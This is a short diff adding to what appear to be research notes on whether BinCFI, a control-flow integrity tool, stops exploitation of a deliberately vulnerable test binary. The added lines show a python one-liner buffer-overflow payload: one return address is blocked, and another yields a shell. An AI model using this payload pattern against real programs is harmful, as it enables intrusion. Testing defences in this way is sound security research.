@@ -24,3 +24,18 @@ Program received signal SIGSEGV, Segmentation fault.
 In given cfi-1.1.tar.gz, it has no modify_ldt directory.
 Even though the folder doesn't exist, modifying elf seems work.
 However, the result was same. The exploit works.
+
+- If I tried to jump to 0x80484d1, then it gives me an error message.
+Therefore, the exploitability is not caused by our misconfiguration.
+But it is the problem of BinCFI. It does not give any Control Flow "Integrity"
+
+mingwei@ubuntu:~/cfi/python_rw$ ./target_elf/vuln/vuln_final \
+                                  `python -c'print"A"*268+"\xd1\x84\x04\x08"'`
+GIVE ME INPUT
+      2897: invalid target address: 80484d1 vuln
+mingwei@ubuntu:~/cfi/python_rw$ ./target_elf/vuln/vuln_final \
+                                  `python -c'print"A"*268+"\xca\x84\x04\x08"'`
+GIVE ME INPUT
+$ echo 'PWNED!' 
+PWNED!
+
